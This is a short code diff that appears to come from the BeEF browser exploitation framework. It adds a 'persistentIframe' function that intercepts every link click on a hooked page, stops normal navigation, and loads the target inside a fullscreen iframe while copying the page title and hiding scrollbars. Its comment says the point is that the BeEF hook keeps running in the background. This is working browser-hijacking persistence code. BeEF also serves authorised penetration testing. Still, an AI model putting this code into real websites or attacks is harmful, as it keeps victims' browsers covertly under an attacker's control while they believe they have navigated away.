@@ -108,6 +108,25 @@ beef.dom = {
 		}
 		return iframe;
 	},
+
+    /**
+     * Load the link (href value) in an overlay foreground iFrame.
+     * The BeEF hook continues to run in background.
+     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
+     * Framebusting techniques, this will not work.
+     */
+    persistentIframe: function(){
+        $j('a').click(function(e) {
+            if ($j(this).attr('href') != '')
+            {
+                e.preventDefault();
+                beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
+                $j(document).attr('title', $j(this).html());
+                document.body.scroll = "no";
+                document.documentElement.style.overflow = 'hidden';
+            }
+        });
+    },
 	
 	/**
      * Create a form element with the specified parameters, appending it to the DOM if append == true
